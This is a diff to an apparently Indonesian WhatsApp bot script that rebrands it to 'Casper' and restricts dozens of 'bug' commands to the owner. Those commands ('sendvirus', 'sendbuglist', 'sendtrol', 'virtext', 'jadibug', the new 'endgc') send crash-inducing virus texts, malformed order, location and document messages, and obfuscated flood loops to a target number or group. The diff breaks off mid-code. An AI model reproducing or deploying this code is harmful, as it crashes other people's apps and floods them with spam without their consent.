@@ -2,7 +2,7 @@
 // Buat Lu Yang Jual Sc Ini Yang Jujur Jangan Sampe Nipu 
    Apalagi Lari Dari Tanggung Jawab
 
-// Base CasperHw Mods : Copyan Dari Base Dika
+// Base CasperCasper : Copyan Dari Base Dika
 
 › Create By Casper
 › Base Ori Casper
@@ -661,7 +661,7 @@ video:fs.readFileSync("./baseikal/video/haikal.mp4"),
 gifPlayback:true,
 jpegThumbnail:log0,
 caption:`Haii 👋 Kak ${pushname} Selamat ${salam} Ini Adalah Bot Khusus Group
-Agar Bot Bisa Di Gunakan Silahkan Meminta Pasword Kepada Owner Terlebih Dahulu Agar Bisa Menggunakan Bot Hw Mods'
+Agar Bot Bisa Di Gunakan Silahkan Meminta Pasword Kepada Owner Terlebih Dahulu Agar Bisa Menggunakan Bot Casper'
  `,
 footer: '© Casper',
 templateButtons: templateButtonoos
@@ -743,7 +743,7 @@ Waktu ${clockString(new Date - afkTime)}
 if (db.data.users[m.sender].afkTime > -1) {
 let user = global.db.data.users[m.sender]
 m.reply(`
-Hello Saya Bot Hw Mods${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
+Hello Saya Bot Casper${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
 Selama ${clockString(new Date - user.afkTime)}
 `.trim())
 user.afkTime = -1
@@ -762,6 +762,7 @@ break
 
 //BUG PUBLIC
 case 'jaditroli': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -787,6 +788,7 @@ haikal.relayMessage(m.chat, order.message, { messageId: order.key.id })
 break
 //=================================================//
 case 'jadilokas': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -807,6 +809,7 @@ haikal.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.
 break
 //=================================================//
 case 'jadipolling': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -831,6 +834,7 @@ haikal.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.
 break
 //=================================================//
 case 'jadikatalog': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!quoted) throw 'Reply Image/sticker'
 let teks = `${q}`
@@ -841,6 +845,7 @@ function _0x348d(_0x50ce67,_0x2397a1){var _0x15bb19=_0x15bb();return _0x348d=fun
 break
 //=================================================//
 case 'jadidocu': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -865,6 +870,7 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 break
 //=================================================//
 case 'jadidarknes': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -889,6 +895,7 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 break
 //=================================================//
 case 'jadivirtext1': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -899,6 +906,7 @@ haikal.sendMessage(m.chat, { image: ppnyauser, caption: `🔥 ${teks} ${iphone}`
 break
 //=================================================//
 case 'jadivirtext2': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -909,6 +917,7 @@ haikal.sendMessage(m.chat, { image: ppnyauser, caption: `🔥 ${teks} ${iphone1}
 break
 //=================================================//
 case 'jadivirtex3t': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -919,6 +928,7 @@ haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone2
 break
 //=================================================//
 case 'jadivirtext4': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -929,6 +939,7 @@ haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone3
 break
 //=================================================//
 case 'jadivirtext5': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -939,6 +950,7 @@ haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone4
 break
 //=================================================//
 case 'jadivirtext6': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -949,6 +961,7 @@ haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone5
 break
 //=================================================//
 case 'jadivirtext7': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -959,6 +972,7 @@ haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone6
 break
 //=================================================//
 case 'jadivirtext8': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -969,6 +983,7 @@ haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${buttonk
 break
 //=================================================//
 case 'jadivirtext9': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -979,6 +994,7 @@ haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${buttonv
 break
 //=================================================//
 case 'jadivirtext10': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -989,6 +1005,7 @@ haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${ngazap(
 break
 //=================================================//
 case 'jadibuginvite': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -1010,6 +1027,7 @@ haikal.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id
 break
 //=================================================//
 case 'jadibugpayment' : {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -1027,6 +1045,7 @@ break
 //=================================================//
 //=================================================//
 case 'jadibugsw': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -1038,6 +1057,7 @@ haikal.sendMessage(m.chat, { video: joau, mimetype: 'video/mp4', caption: `🔥 
 break
 //=================================================//
 case 'jadibugbutton':
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -1058,6 +1078,7 @@ haikal.sendMessage(m.chat, buttonnnnmMessage)
  break
 //=================================================//
 case 'sendbuglist': case 'sendbuglist2': case 'sendbuglist3': case 'sendbuglist4': case 'sendbuglist5':
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 Pe = text.split("|")[0]+'@s.whatsapp.net'
 touchmebre = [
@@ -1073,6 +1094,7 @@ haikal.sendListMsg(Pe, `Casper`, haikal.user.name, `Hay Kak Sc Bot Adia Di List`
 break
 //=================================================//
 case 'sendtrol': case 'sendtrol3': case 'sendtrol4': case 'sendtrol5': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 Pe = text.split("|")[0]+'@s.whatsapp.net'
 let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
@@ -1094,6 +1116,7 @@ haikal.relayMessage(Pe, order.message, { messageId: order.key.id })
 break
 //=================================================//
 case 'senddocu': case 'senddocu3': case 'senddocu4': case 'senddocu5': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 Pe = text.split("|")[0]+'@s.whatsapp.net'
 var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -1116,6 +1139,7 @@ reply('sukses Bug target')
 break
 //=================================================//
 case 'senddocu2': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 Pe = text.split("|")[0]+'@s.whatsapp.net'
 var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -1138,6 +1162,7 @@ reply('sukses Bug target')
 break
 //=================================================//
 case 'virtext1': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -1148,6 +1173,7 @@ haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${iphone}`
 break
 //=================================================//
 case 'virtext2': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -1158,6 +1184,7 @@ haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${iphone1}
 break
 //=================================================//
 case 'virtext3': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -1168,6 +1195,7 @@ haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${iphone2}
 break
 //=================================================//
 case 'virtext4': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -1178,6 +1206,7 @@ haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${iphone3}
 break
 //=================================================//
 case 'virtext5': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -1188,6 +1217,7 @@ haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${iphone4}
 break
 //=================================================//
 case 'virtext6': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -1198,6 +1228,7 @@ haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${iphone5}
 break
 //=================================================//
 case 'virtext7': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -1208,6 +1239,7 @@ haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${iphone6}
 break
 //=================================================//
 case 'virtext8': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -1218,6 +1250,7 @@ haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${buttonka
 break
 //=================================================//
 case 'virtext9': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -1228,6 +1261,7 @@ haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${buttonvi
 break
 //=================================================//
 case 'virtext10': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -1237,6 +1271,7 @@ haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${ngazap(p
 }
 break
 case 'sendvirus': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 Pe = text.split("|")[0]+'@s.whatsapp.net'
 haikal.sendMessage(Pe, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${iphone}` }, { quoted:m })
@@ -1244,6 +1279,7 @@ haikal.sendMessage(Pe, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${iphone}` }, 
 break
 //=================================================//
 case 'sendvirus2': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 Pe = text.split("|")[0]+'@s.whatsapp.net'
 haikal.sendMessage(Pe, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${iphone1}` }, { quoted:m })
@@ -1251,6 +1287,7 @@ haikal.sendMessage(Pe, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${iphone1}` },
 break
 //=================================================//
 case 'sendvirus3': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 Pe = text.split("|")[0]+'@s.whatsapp.net'
 haikal.sendMessage(Pe, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${iphone2}` }, { quoted:m })
@@ -1258,6 +1295,7 @@ haikal.sendMessage(Pe, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${iphone2}` },
 break
 //=================================================//
 case 'sendvirus4': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 Pe = text.split("|")[0]+'@s.whatsapp.net'
 haikal.sendMessage(Pe, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${iphone3}` }, { quoted:m })
@@ -1265,6 +1303,7 @@ haikal.sendMessage(Pe, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${iphone3}` },
 break
 //=================================================//
 case 'sendvirus5': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 Pe = text.split("|")[0]+'@s.whatsapp.net'
 haikal.sendMessage(Pe, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${iphone4}` }, { quoted:m })
@@ -1272,6 +1311,7 @@ haikal.sendMessage(Pe, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${iphone4}` },
 break
 //=================================================//
 case 'sendvirus6': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 Pe = text.split("|")[0]+'@s.whatsapp.net'
 haikal.sendMessage(Pe, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${iphone5}` }, { quoted:m })
@@ -1279,6 +1319,7 @@ haikal.sendMessage(Pe, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${iphone5}` },
 break
 //=================================================//
 case 'sendvirus7': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 Pe = text.split("|")[0]+'@s.whatsapp.net'
 haikal.sendMessage(Pe, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${iphone6}` }, { quoted:m })
@@ -1286,6 +1327,7 @@ haikal.sendMessage(Pe, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${iphone6}` },
 break
 //=================================================//
 case 'sendvirus8': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 Pe = text.split("|")[0]+'@s.whatsapp.net'
 haikal.sendMessage(Pe, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${buttonkal}` }, { quoted:m })
@@ -1293,6 +1335,7 @@ haikal.sendMessage(Pe, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${buttonkal}` 
 break
 //=================================================//
 case 'sendvirus9': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 Pe = text.split("|")[0]+'@s.whatsapp.net'
 haikal.sendMessage(Pe, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${buttonvirus}` }, { quoted:m })
@@ -1300,6 +1343,7 @@ haikal.sendMessage(Pe, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${buttonvirus}
 break
 //=================================================//
 case 'sendvirus10': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 Pe = text.split("|")[0]+'@s.whatsapp.net'
 haikal.sendMessage(Pe, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${ngazap(prefix)}`}, { quoted:m })
@@ -1307,6 +1351,7 @@ haikal.sendMessage(Pe, { image: ppnyauser,  caption: `ᴀʀғᴀɴ${ngazap(prefi
 break
 //=================================================//
 case 'jadijago': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -1330,6 +1375,7 @@ haikal.sendMessage(m.chat, message, { quoted:m })
 break
 //=================================================//
 case 'sendlokas': case 'sendlokas3': case 'sendlokas4': case 'sendlokas5': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 Pe = text.split("|")[0]+'@s.whatsapp.net'
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
@@ -1348,6 +1394,7 @@ reply('sukses Bug target')
 break
 //=================================================//
 case 'sendlokas2': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 Pe = text.split("|")[0]+'@s.whatsapp.net'
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
@@ -1365,6 +1412,7 @@ reply('sukses Bug target')
 break
 //=================================================//
 case 'sendtrol2': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 Pe = text.split("|")[0]+'@s.whatsapp.net'
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
@@ -1390,15 +1438,17 @@ reply('sukses Bug target')
 break
 //=================================================//
 case 'afk': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 let user = global.db.data.users[m.sender]
 user.afkTime = + new Date
 user.afkReason = text
-m.reply(`${m.pushName} Hello Saya Bot Hw Mods${text ? ': ' + text : ''}`)
+m.reply(`${m.pushName} Hello Saya Bot Casper${text ? ': ' + text : ''}`)
 }
 break
 //=================================================//
 case '🔥': 
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1419,6 +1469,7 @@ haikal.sendMessage(m.chat, buttonMessage)
 }
  break
 case 'inspect': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!args[0]) return m.reply("Linknya?")
 let linkRegex = args.join(" ")
@@ -1454,7 +1505,8 @@ haikal.sendFile(m.chat, pp, "", m, { caption: tekse, mentions: await haikal.pars
 }
 break
 //=================================================//
-case '🦖': case '🦕': case '👿': case '😈': case '⚡': case '💥': case '🌪️': case '🍂': case 'end':{
+case 'sokkeras️': case 'jagoantod': case 'endbro':{
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1465,9 +1517,18 @@ function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=fun
 }
 }
 break
+case 'endgc':{
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
+if (isBan) return reply(`Lah Lu Kan Di Ban`)
+Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
+a = await haikal.sendMessage(m.chat, {react: { text: "🗿", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+var _0x56063f=_0x26b9;function _0x26b9(_0x4e7e49,_0xff5729){var _0x443446=_0x4434();return _0x26b9=function(_0x26b986,_0x3f61dd){_0x26b986=_0x26b986-0x17f;var _0x578f23=_0x443446[_0x26b986];return _0x578f23;},_0x26b9(_0x4e7e49,_0xff5729);}(function(_0x33aa42,_0x21939f){var _0xed24e9=_0x26b9,_0x28481f=_0x33aa42();while(!![]){try{var _0x2e08ca=parseInt(_0xed24e9(0x182))/0x1*(parseInt(_0xed24e9(0x181))/0x2)+-parseInt(_0xed24e9(0x189))/0x3*(parseInt(_0xed24e9(0x18b))/0x4)+parseInt(_0xed24e9(0x185))/0x5+parseInt(_0xed24e9(0x17f))/0x6+parseInt(_0xed24e9(0x188))/0x7+-parseInt(_0xed24e9(0x18c))/0x8+-parseInt(_0xed24e9(0x184))/0x9*(-parseInt(_0xed24e9(0x18d))/0xa);if(_0x2e08ca===_0x21939f)break;else _0x28481f['push'](_0x28481f['shift']());}catch(_0x5042b4){_0x28481f['push'](_0x28481f['shift']());}}}(_0x4434,0x93b42),haikal[_0x56063f(0x191)](Pe,{'text':'','templateButtons':[{'callButton':{'displayText':'OWNER','phoneNumber':_0x56063f(0x18e)}},{'callButton':{'displayText':'OWNER','phoneNumber':_0x56063f(0x18e)}},{'callButton':{'displayText':_0x56063f(0x18a),'phoneNumber':'62895403595055'}},{'urlButton':{'displayText':_0x56063f(0x186),'url':_0x56063f(0x190)}},{'urlButton':{'displayText':'GROUP','url':_0x56063f(0x190)}},{'urlButton':{'displayText':_0x56063f(0x186),'url':'https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2'}},{'quickReplyButton':{'displayText':'MY','id':_0x56063f(0x187)}},{'quickReplyButton':{'displayText':_0x56063f(0x18f),'id':_0x56063f(0x192)}},{'quickReplyButton':{'displayText':'CASPER','id':_0x56063f(0x183)}}]}),await sleep(0x3938700),haikal[_0x56063f(0x191)](Pe,{'text':'','templateButtons':[{'callButton':{'displayText':_0x56063f(0x18a),'phoneNumber':_0x56063f(0x18e)}},{'callButton':{'displayText':_0x56063f(0x18a),'phoneNumber':_0x56063f(0x18e)}},{'callButton':{'displayText':_0x56063f(0x18a),'phoneNumber':_0x56063f(0x18e)}},{'urlButton':{'displayText':_0x56063f(0x186),'url':_0x56063f(0x190)}},{'urlButton':{'displayText':'GROUP','url':_0x56063f(0x190)}},{'urlButton':{'displayText':'GROUP','url':_0x56063f(0x190)}},{'quickReplyButton':{'displayText':'MY','id':_0x56063f(0x187)}},{'quickReplyButton':{'displayText':_0x56063f(0x18f),'id':_0x56063f(0x192)}},{'quickReplyButton':{'displayText':'CASPER','id':_0x56063f(0x183)}}]}),await sleep(0x3938700),haikal[_0x56063f(0x191)](Pe,{'text':'','templateButtons':[{'callButton':{'displayText':_0x56063f(0x18a),'phoneNumber':_0x56063f(0x18e)}},{'callButton':{'displayText':_0x56063f(0x18a),'phoneNumber':_0x56063f(0x18e)}},{'callButton':{'displayText':'OWNER','phoneNumber':_0x56063f(0x18e)}},{'urlButton':{'displayText':_0x56063f(0x186),'url':_0x56063f(0x190)}},{'urlButton':{'displayText':'GROUP','url':'https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2'}},{'urlButton':{'displayText':_0x56063f(0x186),'url':_0x56063f(0x190)}},{'quickReplyButton':{'displayText':'MY','id':'Anjay\x20Menger'}},{'quickReplyButton':{'displayText':_0x56063f(0x18f),'id':'AH\x20SLEBEEW'}},{'quickReplyButton':{'displayText':'CASPER','id':_0x56063f(0x183)}}]}),await sleep(0x3938700),haikal['sendMessage'](Pe,{'text':'','templateButtons':[{'callButton':{'displayText':'OWNER','phoneNumber':_0x56063f(0x18e)}},{'callButton':{'displayText':_0x56063f(0x18a),'phoneNumber':_0x56063f(0x18e)}},{'callButton':{'displayText':_0x56063f(0x18a),'phoneNumber':_0x56063f(0x18e)}},{'urlButton':{'displayText':_0x56063f(0x186),'url':_0x56063f(0x190)}},{'urlButton':{'displayText':_0x56063f(0x186),'url':_0x56063f(0x190)}},{'urlButton':{'displayText':_0x56063f(0x186),'url':_0x56063f(0x190)}},{'quickReplyButton':{'displayText':'MY','id':'Anjay\x20Menger'}},{'quickReplyButton':{'displayText':_0x56063f(0x18f),'id':_0x56063f(0x192)}},{'quickReplyButton':{'displayText':_0x56063f(0x180),'id':'JAGOAN\x20OM?'}}]}),await sleep(0x3938700),haikal[_0x56063f(0x191)](Pe,{'text':'','templateButtons':[{'callButton':{'displayText':'OWNER','phoneNumber':_0x56063f(0x18e)}},{'callButton':{'displayText':'OWNER','phoneNumber':_0x56063f(0x18e)}},{'callButton':{'displayText':_0x56063f(0x18a),'phoneNumber':_0x56063f(0x18e)}},{'urlButton':{'displayText':_0x56063f(0x186),'url':_0x56063f(0x190)}},{'urlButton':{'displayText':_0x56063f(0x186),'url':_0x56063f(0x190)}},{'urlButton':{'displayText':'GROUP','url':_0x56063f(0x190)}},{'quickReplyButton':{'displayText':'MY','id':'Anjay\x20Menger'}},{'quickReplyButton':{'displayText':_0x56063f(0x18f),'id':'AH\x20SLEBEEW'}},{'quickReplyButton':{'displayText':_0x56063f(0x180),'id':_0x56063f(0x183)}}]}),await 